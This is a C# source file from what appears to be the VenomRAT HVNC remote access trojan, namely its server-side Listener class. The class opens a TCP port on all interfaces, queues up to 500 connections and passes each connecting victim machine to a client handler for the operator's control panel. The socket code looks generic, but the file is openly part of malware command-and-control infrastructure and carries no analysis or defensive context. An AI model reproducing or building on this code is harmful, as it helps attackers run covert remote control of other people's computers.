using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using VenomRAT_HVNC.Server.Handle_Packet;

namespace VenomRAT_HVNC.Server.Connection
{
    internal class Listener
    {
        private Socket Server { get; set; }

        public void Connect(object port)
        {
            try
            {
                IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                this.Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    SendBufferSize = 51200,
                    ReceiveBufferSize = 51200
                };
                this.Server.Bind(localEP);
                this.Server.Listen(500);
                new HandleLogs().Addmsg(string.Format("Listenning to: {0}", port), Color.Green);
                this.Server.BeginAccept(new AsyncCallback(this.EndAccept), null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        private void EndAccept(IAsyncResult ar)
        {
            try
            {
                new Clients(this.Server.EndAccept(ar));
            }
            catch
            {
            }
            finally
            {
                this.Server.BeginAccept(new AsyncCallback(this.EndAccept), null);
            }
        }
    }
}
